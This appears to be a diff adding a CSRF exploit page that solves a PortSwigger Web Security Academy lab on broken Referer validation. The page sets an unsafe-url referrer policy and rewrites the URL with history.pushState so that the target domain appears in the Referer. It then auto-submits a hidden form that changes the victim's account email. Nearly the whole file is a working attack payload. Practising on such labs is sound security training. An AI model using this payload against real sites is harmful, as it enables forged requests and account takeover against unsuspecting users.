@@ -1,0 +1,21 @@
+<!-- The payload below is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken -->
+
+<!-- HEAD: -->
+<!--
+    HTTP/1.1 200 OK
+    Content-Type: text/html; charset=utf-8
+    Referrer-Policy: unsafe-url
+-->
+
+<html>
+    <body>
+        <script>history.pushState("", "", "/?[SUB_DOMAIN].web-security-academy.net")</script>
+        <form name="change-email-form" action="https://[SUB_DOMAIN].web-security-academy.net/my-account/change-email" method="POST">
+            <input required="" type="hidden" name="email" value="wiener8@normal-user.net">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
